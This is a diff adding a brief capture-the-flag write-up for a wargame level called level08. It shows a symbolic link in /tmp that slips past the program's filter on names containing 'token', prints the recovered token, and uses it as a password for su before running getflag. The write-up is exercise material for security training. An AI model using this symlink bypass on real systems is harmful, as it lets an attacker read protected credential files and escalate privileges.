@@ -1,0 +1,16 @@
+./level08 takes in a paramter and cats out a file. But won't take anything with "token" in the name.
+
+We also don't have read permission on the token file.
+
+Create symbolic link to a file in temp.
+
+ln -s ~/token /tmp/this
+
+./level08 /tmp/this
+
+Outputs token:
+quif5eloekouj29ke0vouxean
+
+Then can run su flag08 with token as password
+
+and run getflag after
